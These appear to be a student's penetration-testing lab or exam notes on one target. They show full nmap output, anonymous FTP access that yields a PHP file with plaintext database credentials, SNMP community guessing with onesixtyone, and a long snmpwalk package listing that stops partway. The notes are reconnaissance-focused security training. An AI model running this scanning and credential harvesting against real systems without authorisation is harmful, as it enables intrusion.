## Target 1:
```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# nmap -A -vv -p- -T4 -Pn -oX host.scan 192.168.55.110  --webxml
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 21:01 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:01
Completed NSE at 21:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:01
Completed NSE at 21:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:01
Completed NSE at 21:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:01
Completed Parallel DNS resolution of 1 host. at 21:01, 0.03s elapsed
Initiating SYN Stealth Scan at 21:01
Scanning 192.168.55.110 [65535 ports]
Discovered open port 21/tcp on 192.168.55.110
Discovered open port 22/tcp on 192.168.55.110
Increasing send delay for 192.168.55.110 from 0 to 5 due to 11 out of 18 dropped probes since last increase.
SYN Stealth Scan Timing: About 3.18% done; ETC: 21:17 (0:15:45 remaining)
SYN Stealth Scan Timing: About 6.78% done; ETC: 21:17 (0:14:40 remaining)
SYN Stealth Scan Timing: About 12.17% done; ETC: 21:17 (0:13:50 remaining)
SYN Stealth Scan Timing: About 18.27% done; ETC: 21:17 (0:13:03 remaining)
SYN Stealth Scan Timing: About 24.01% done; ETC: 21:17 (0:12:14 remaining)
SYN Stealth Scan Timing: About 29.25% done; ETC: 21:17 (0:11:24 remaining)
SYN Stealth Scan Timing: About 34.75% done; ETC: 21:17 (0:10:33 remaining)
SYN Stealth Scan Timing: About 39.76% done; ETC: 21:17 (0:09:43 remaining)
SYN Stealth Scan Timing: About 44.80% done; ETC: 21:17 (0:08:53 remaining)
SYN Stealth Scan Timing: About 49.71% done; ETC: 21:17 (0:08:04 remaining)
SYN Stealth Scan Timing: About 54.28% done; ETC: 21:17 (0:07:15 remaining)
SYN Stealth Scan Timing: About 59.26% done; ETC: 21:17 (0:06:26 remaining)
Increasing send delay for 192.168.55.110 from 5 to 10 due to max_successful_tryno increase to 5
SYN Stealth Scan Timing: About 64.87% done; ETC: 21:17 (0:05:38 remaining)
SYN Stealth Scan Timing: About 70.19% done; ETC: 21:17 (0:04:48 remaining)
SYN Stealth Scan Timing: About 75.86% done; ETC: 21:18 (0:03:57 remaining)
SYN Stealth Scan Timing: About 81.11% done; ETC: 21:18 (0:03:07 remaining)
SYN Stealth Scan Timing: About 86.18% done; ETC: 21:18 (0:02:17 remaining)
SYN Stealth Scan Timing: About 91.47% done; ETC: 21:18 (0:01:24 remaining)
SYN Stealth Scan Timing: About 96.65% done; ETC: 21:18 (0:00:34 remaining)
Warning: 192.168.55.110 giving up on port because retransmission cap hit (6).
Completed SYN Stealth Scan at 21:19, 1090.35s elapsed (65535 total ports)
Initiating Service scan at 21:19
Scanning 2 services on 192.168.55.110
Completed Service scan at 21:19, 0.38s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.55.110
Initiating Traceroute at 21:19
Completed Traceroute at 21:19, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:19
Completed Parallel DNS resolution of 2 hosts. at 21:19, 0.04s elapsed
NSE: Script scanning 192.168.55.110.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:19
NSE: [ftp-bounce 192.168.55.110:21] PORT response: 500 Illegal PORT command.
Completed NSE at 21:19, 4.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:19
Completed NSE at 21:19, 1.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:19
Completed NSE at 21:19, 0.01s elapsed
Nmap scan report for 192.168.55.110
Host is up, received user-set (0.17s latency).
Scanned at 2025-12-18 21:01:40 -03 for 1099s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE REASON         VERSION
21/tcp    open     ftp     syn-ack ttl 63 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 02  2023 db
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.55
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8b:81:8c:c9:d8:f9:8d:cf:94:04:98:57:a1:ea:69:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA0cYxNy9hX8v9TplDAvLmiPTIPpSYAhHDCSSSm76zYiWT9ba2tDutdCBAbQylI7LRKMPGhqaZ+OiJjSLHs9MjE=
|   256 51:8a:c9:94:5f:37:dd:34:fc:32:02:43:12:78:0f:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrHtwmqD+qItSzFiUTUWzKQyHqy3kWSxcX/q0KbxC5C
28806/tcp filtered unknown no-response
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/18%OT=21%CT=1%CU=37283%PV=Y%DS=2%DC=T%G=Y%TM=69449A
OS:2F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M551S
OS:T11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M
OS:551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y
OS:%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=
OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 13.226 days (since Fri Dec  5 15:54:11 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   161.86 ms 192.168.49.1
2   161.97 ms 192.168.55.110

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:19
Completed NSE at 21:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:19
Completed NSE at 21:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:19
Completed NSE at 21:19, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1099.78 seconds
           Raw packets sent: 74660 (3.286MB) | Rcvd: 70137 (2.807MB)
```

* ftp anonimo

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# lftp -u anonymous, 192.168.55.110
lftp anonymous@192.168.55.110:~> set ftp:passive-mode off
lftp anonymous@192.168.55.110:~> ls
drwxr-xr-x    2 0        0            4096 Jun 02  2023 db
lftp anonymous@192.168.55.110:/> get db
get: Access failed: 550 Failed to open file. (db)
lftp anonymous@192.168.55.110:/> cd db
lftp anonymous@192.168.55.110:/db> ls
-rwxrwxr-x    1 65534    65534         238 Jun 02  2023 db_connect.php
lftp anonymous@192.168.55.110:/db> help
    !<shell-command>                     (commands)                           alias [<name> [<value>]]             attach [PID]                         bookmark [SUBCMD]                    cache [SUBCMD]
    cat [-b] <files>                     cd <rdir>                            chmod [OPTS] mode file...            close [-a]                           [re]cls [opts] [path/][pattern]      debug [OPTS] [<level>|off]
    du [options] <dirs>                  edit [OPTS] <file>                   exit [<code>|bg]                     get [OPTS] <rfile> [-o <lfile>]      glob [OPTS] <cmd> <args>             help [<cmd>]
    history -w file|-r file|-c|-l [cnt]  jobs [-v] [<job_no...>]              kill all|<job_no>                    lcd <ldir>                           lftp [OPTS] <site>                   ln [-s] <file1> <file2>
    ls [<args>]                          mget [OPTS] <files>                  mirror [OPTS] [remote [local]]       mkdir [OPTS] <dirs>                  module name [args]                   more <files>
    mput [OPTS] <files>                  mrm <files>                          mv <file1> <file2>                   mmv [OPTS] <files> <target-dir>      [re]nlist [<args>]                   open [OPTS] <site>
    pget [OPTS] <rfile> [-o <lfile>]     put [OPTS] <lfile> [-o <rfile>]      pwd [-p]                             queue [OPTS] [<cmd>]                 quote <cmd>                          repeat [OPTS] [delay] [command]
    rm [-r] [-f] <files>                 rmdir [-f] <dirs>                    scache [<session_no>]                set [OPT] [<var> [<val>]]            site <site-cmd>                      source <file>
    torrent [OPTS] <file|URL>...         user <user|URL> [<pass>]             wait [<jobno>]                       zcat <files>                         zmore <files>
lftp anonymous@192.168.55.110:/db> cat db_connect.php
<?php                                                   
        define("DB_SERVER","localhost");
        define("DB_USER","student");
        define("DB_PASS","secret%pass");
        define("DB_NAME","oscp");
?>

<?php
        require_once('db_connect.php');
        $db = mysqli_connect(DB_SERVER, DB_USER, DB_PASS, DB_NAME);
?>
238 bytes transferred
lftp anonymous@192.168.55.110:/db> 
```

* UDP

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# nmap -sU -p 161 -sV -sC -vv  192.168.55.110 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 00:20 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
Initiating Ping Scan at 00:20
Scanning 192.168.55.110 [4 ports]
Completed Ping Scan at 00:20, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:20
Completed Parallel DNS resolution of 1 host. at 00:20, 0.02s elapsed
Initiating UDP Scan at 00:20
Scanning 192.168.55.110 [1 port]
Discovered open port 161/udp on 192.168.55.110
Completed UDP Scan at 00:20, 0.47s elapsed (1 total ports)
Initiating Service scan at 00:20
NSE: Script scanning 192.168.55.110.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 10.37s elapsed
NSE: Starting runlevel 2 (of 3) scan.                                                                                                  
Initiating NSE at 00:20                                                                                                                
Completed NSE at 00:20, 0.00s elapsed                                                                                                  
NSE: Starting runlevel 3 (of 3) scan.                                                                                                  
Initiating NSE at 00:20                                                                                                                
Completed NSE at 00:20, 0.00s elapsed                                                                                                  
Nmap scan report for 192.168.55.110                                                                                                    
Host is up, received timestamp-reply ttl 63 (0.17s latency).                                                                           
Scanned at 2025-12-19 00:20:09 -03 for 11s                                                                                             
                                                                                                                                       
PORT    STATE SERVICE REASON              VERSION                                                                                      
161/udp open  snmp    udp-response ttl 63 net-snmp; net-snmp SNMPv3 server                                                             
| snmp-info:                                                                                                                           
|   enterprise: net-snmp                                                                                                               
|   engineIDFormat: unknown
|   engineIDData: a58fd418f819ea6300000000
|   snmpEngineBoots: 21
|_  snmpEngineTime: 9h01m06s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:20
Completed NSE at 00:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
           Raw packets sent: 6 (319B) | Rcvd: 2 (180B)
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.55.110
Scanning 1 hosts, 3219 communities
192.168.55.110 [security] Linux oscp 5.15.0-60-generic #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023
```

```bash
┌──(root💀kali)-[/home/…/Exam-2/machines/StandAlone/machine-1]
└─# snmpwalk -v2c -c security 192.168.55.110 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "adduser_3.118ubuntu5_all"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "amd64-microcode_3.20191218.1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "apparmor_3.0.4-2ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "apport_2.20.11-0ubuntu82.3_all"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "apport-symptoms_0.24_all"
iso.3.6.1.2.1.25.6.3.1.2.6 = STRING: "apt_2.4.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.7 = STRING: "apt-utils_2.4.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.8 = STRING: "base-files_12ubuntu4.2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.9 = STRING: "base-passwd_3.5.52build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.10 = STRING: "bash_5.1-6ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.11 = STRING: "bash-completion_1:2.11-5ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.12 = STRING: "bc_1.07.1-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: "bcache-tools_1.0.8-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.14 = STRING: "bind9-dnsutils_1:9.18.1-1ubuntu1.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.15 = STRING: "bind9-host_1:9.18.1-1ubuntu1.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.16 = STRING: "bind9-libs_1:9.18.1-1ubuntu1.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.17 = STRING: "binutils_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.18 = STRING: "binutils-common_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.19 = STRING: "binutils-x86-64-linux-gnu_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.20 = STRING: "bolt_0.9.2-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.21 = STRING: "bsdextrautils_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.22 = STRING: "bsdutils_1:2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.23 = STRING: "btrfs-progs_5.16.2-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.24 = STRING: "busybox-initramfs_1:1.30.1-7ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.25 = STRING: "busybox-static_1:1.30.1-7ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.26 = STRING: "byobu_5.133-1_all"
iso.3.6.1.2.1.25.6.3.1.2.27 = STRING: "ca-certificates_20211016ubuntu0.22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.28 = STRING: "cloud-guest-utils_0.32-22-g45fe84a5-0ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.29 = STRING: "cloud-init_22.4.2-0ubuntu0~22.04.1_all"
iso.3.6.1.2.1.25.6.3.1.2.30 = STRING: "cloud-initramfs-copymods_0.47ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.31 = STRING: "cloud-initramfs-dyn-netconf_0.47ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.32 = STRING: "command-not-found_22.04.0_all"
iso.3.6.1.2.1.25.6.3.1.2.33 = STRING: "console-setup_1.205ubuntu3_all"
iso.3.6.1.2.1.25.6.3.1.2.34 = STRING: "console-setup-linux_1.205ubuntu3_all"
iso.3.6.1.2.1.25.6.3.1.2.35 = STRING: "coreutils_8.32-4.1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.36 = STRING: "cpio_2.13+dfsg-7_amd64"
iso.3.6.1.2.1.25.6.3.1.2.37 = STRING: "cron_3.0pl1-137ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.38 = STRING: "cryptsetup_2:2.4.3-1ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.39 = STRING: "cryptsetup-bin_2:2.4.3-1ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.40 = STRING: "cryptsetup-initramfs_2:2.4.3-1ubuntu1.1_all"
iso.3.6.1.2.1.25.6.3.1.2.41 = STRING: "curl_7.81.0-1ubuntu1.7_amd64"
iso.3.6.1.2.1.25.6.3.1.2.42 = STRING: "dash_0.5.11+git20210903+057cd650a4ed-3build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.43 = STRING: "dbus_1.12.20-2ubuntu4.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.44 = STRING: "dbus-user-session_1.12.20-2ubuntu4.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.45 = STRING: "debconf_1.5.79ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.46 = STRING: "debconf-i18n_1.5.79ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.47 = STRING: "debianutils_5.5-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.48 = STRING: "diffutils_1:3.8-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.49 = STRING: "dirmngr_2.2.27-3ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.50 = STRING: "distro-info_1.1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.51 = STRING: "distro-info-data_0.52ubuntu0.2_all"
iso.3.6.1.2.1.25.6.3.1.2.52 = STRING: "dmeventd_2:1.02.175-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.53 = STRING: "dmidecode_3.3-3ubuntu0.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.54 = STRING: "dmsetup_2:1.02.175-2.1ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.55 = STRING: "dosfstools_4.2-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.56 = STRING: "dpkg_1.21.1ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.57 = STRING: "e2fsprogs_1.46.5-2ubuntu1.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.58 = STRING: "eatmydata_130-2build1_all"
iso.3.6.1.2.1.25.6.3.1.2.59 = STRING: "ed_1.18-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.60 = STRING: "eject_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.61 = STRING: "ethtool_1:5.16-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.62 = STRING: "fdisk_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.63 = STRING: "file_1:5.41-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.64 = STRING: "finalrd_9build1_all"
iso.3.6.1.2.1.25.6.3.1.2.65 = STRING: "findutils_4.8.0-1ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.66 = STRING: "firmware-sof-signed_2.0-1ubuntu4.1_all"
iso.3.6.1.2.1.25.6.3.1.2.67 = STRING: "fonts-ubuntu-console_0.83-6ubuntu1_all"
iso.3.6.1.2.1.25.6.3.1.2.68 = STRING: "friendly-recovery_0.2.42_all"
iso.3.6.1.2.1.25.6.3.1.2.69 = STRING: "ftp_20210827-4build1_all"
iso.3.6.1.2.1.25.6.3.1.2.70 = STRING: "fuse3_3.10.5-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.71 = STRING: "fwupd_1.7.9-1~22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.72 = STRING: "fwupd-signed_1.44+1.2-3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.73 = STRING: "gawk_1:5.1.0-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.74 = STRING: "gcc-12-base_12.1.0-2ubuntu1~22.04_amd64"
iso.3.6.1.2.1.25.6.3.1.2.75 = STRING: "gdisk_1.0.8-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.76 = STRING: "gettext-base_0.21-4ubuntu4_amd64"
iso.3.6.1.2.1.25.6.3.1.2.77 = STRING: "gir1.2-glib-2.0_1.72.0-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.78 = STRING: "gir1.2-packagekitglib-1.0_1.2.5-2ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.79 = STRING: "git_1:2.34.1-1ubuntu1.6_amd64"                                                                  
iso.3.6.1.2.1.25.6.3.1.2.80 = STRING: "git-man_1:2.34.1-1ubuntu1.6_all"                                                                
iso.3.6.1.2.1.25.6.3.1.2.81 = STRING: "gnupg_2.2.27-3ubuntu2.1_all"                                                                    
iso.3.6.1.2.1.25.6.3.1.2.82 = STRING: "gnupg-l10n_2.2.27-3ubuntu2.1_all"                                                               
iso.3.6.1.2.1.25.6.3.1.2.83 = STRING: "gnupg-utils_2.2.27-3ubuntu2.1_amd64"                                                            
iso.3.6.1.2.1.25.6.3.1.2.84 = STRING: "gpg_2.2.27-3ubuntu2.1_amd64"                                                                    
iso.3.6.1.2.1.25.6.3.1.2.85 = STRING: "gpg-agent_2.2.27-3ubuntu2.1_amd64"                                                              
iso.3.6.1.2.1.25.6.3.1.2.86 = STRING: "gpg-wks-client_2.2.27-3ubuntu2.1_amd64"                                                         
iso.3.6.1.2.1.25.6.3.1.2.87 = STRING: "gpg-wks-server_2.2.27-3ubuntu2.1_amd64"                                                         
iso.3.6.1.2.1.25.6.3.1.2.88 = STRING: "gpgconf_2.2.27-3ubuntu2.1_amd64"                                                                
iso.3.6.1.2.1.25.6.3.1.2.89 = STRING: "gpgsm_2.2.27-3ubuntu2.1_amd64"                                                                  
iso.3.6.1.2.1.25.6.3.1.2.90 = STRING: "gpgv_2.2.27-3ubuntu2.1_amd64"                                                                   
iso.3.6.1.2.1.25.6.3.1.2.91 = STRING: "grep_3.7-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.92 = STRING: "groff-base_1.22.4-8build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.93 = STRING: "grub-common_2.06-2ubuntu7.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.94 = STRING: "grub-gfxpayload-lists_0.7_amd64"
iso.3.6.1.2.1.25.6.3.1.2.95 = STRING: "grub-pc_2.06-2ubuntu7.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.96 = STRING: "grub-pc-bin_2.06-2ubuntu7.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.97 = STRING: "grub2-common_2.06-2ubuntu7.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.98 = STRING: "gzip_1.10-4ubuntu4.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.99 = STRING: "hdparm_9.60+ds-1build3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.100 = STRING: "hostname_3.23ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.101 = STRING: "htop_3.0.5-7build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.102 = STRING: "info_6.8-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.103 = STRING: "init_1.62_amd64"
iso.3.6.1.2.1.25.6.3.1.2.104 = STRING: "init-system-helpers_1.62_all"
iso.3.6.1.2.1.25.6.3.1.2.105 = STRING: "initramfs-tools_0.140ubuntu13.1_all"
iso.3.6.1.2.1.25.6.3.1.2.106 = STRING: "initramfs-tools-bin_0.140ubuntu13.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.107 = STRING: "initramfs-tools-core_0.140ubuntu13.1_all"
iso.3.6.1.2.1.25.6.3.1.2.108 = STRING: "install-info_6.8-4build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.109 = STRING: "intel-microcode_3.20220809.0ubuntu0.22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.110 = STRING: "iproute2_5.15.0-1ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.111 = STRING: "iptables_1.8.7-1ubuntu5_amd64"
iso.3.6.1.2.1.25.6.3.1.2.112 = STRING: "iptables-persistent_1.0.16_all"
iso.3.6.1.2.1.25.6.3.1.2.113 = STRING: "iputils-ping_3:20211215-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.114 = STRING: "iputils-tracepath_3:20211215-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.115 = STRING: "irqbalance_1.8.0-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.116 = STRING: "isc-dhcp-client_4.4.1-2.3ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.117 = STRING: "isc-dhcp-common_4.4.1-2.3ubuntu2.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.118 = STRING: "iso-codes_4.9.0-1_all"                                                                         
iso.3.6.1.2.1.25.6.3.1.2.119 = STRING: "iucode-tool_2.3.1-1build1_amd64"                                                               
iso.3.6.1.2.1.25.6.3.1.2.120 = STRING: "kbd_2.3.0-3ubuntu4.22.04_amd64"                                                                
iso.3.6.1.2.1.25.6.3.1.2.121 = STRING: "keyboard-configuration_1.205ubuntu3_all"                                                       
iso.3.6.1.2.1.25.6.3.1.2.122 = STRING: "klibc-utils_2.0.10-4_amd64"                                                                    
iso.3.6.1.2.1.25.6.3.1.2.123 = STRING: "kmod_29-1ubuntu1_amd64"                                                                        
iso.3.6.1.2.1.25.6.3.1.2.124 = STRING: "kpartx_0.8.8-1ubuntu1.22.04.1_amd64"                                                           
iso.3.6.1.2.1.25.6.3.1.2.125 = STRING: "landscape-common_19.12-0ubuntu13_amd64"                                                        
iso.3.6.1.2.1.25.6.3.1.2.126 = STRING: "less_590-1ubuntu0.22.04.1_amd64"                                                               
iso.3.6.1.2.1.25.6.3.1.2.127 = STRING: "libacl1_2.3.1-1_amd64"                                                                         
iso.3.6.1.2.1.25.6.3.1.2.128 = STRING: "libaio1_0.3.112-13build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.129 = STRING: "libapparmor1_3.0.4-2ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.130 = STRING: "libappstream4_0.15.2-2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.131 = STRING: "libapt-pkg6.0_2.4.8_amd64"
iso.3.6.1.2.1.25.6.3.1.2.132 = STRING: "libarchive13_3.6.0-1ubuntu1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.133 = STRING: "libargon2-1_0~20171227-0.3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.134 = STRING: "libassuan0_2.5.5-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.135 = STRING: "libatasmart4_0.19-5build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.136 = STRING: "libatm1_1:2.5.1-4build2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.137 = STRING: "libattr1_1:2.5.1-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.138 = STRING: "libaudit-common_1:3.0.7-1build1_all"
iso.3.6.1.2.1.25.6.3.1.2.139 = STRING: "libaudit1_1:3.0.7-1build1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.140 = STRING: "libbinutils_2.38-4ubuntu2.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.141 = STRING: "libblkid1_2.37.2-4ubuntu3_amd64"
iso.3.6.1.2.1.25.6.3.1.2.142 = STRING: "libblockdev-crypto2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.143 = STRING: "libblockdev-fs2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.144 = STRING: "libblockdev-loop2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.145 = STRING: "libblockdev-part-err2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.146 = STRING: "libblockdev-part2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.147 = STRING: "libblockdev-swap2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.148 = STRING: "libblockdev-utils2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.149 = STRING: "libblockdev2_2.26-1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.150 = STRING: "libbpf0_1:0.5.0-1ubuntu22.04.1_amd64"
iso.3.6.1.2.1.25.6.3.1.2.151 = STRING: "libbrotli1_1.0.9-2build6_amd64"
iso.3.6.1.2.1.25.6.3.1.2.152 = STRING: "libbsd0_0.11.5-1_amd64"
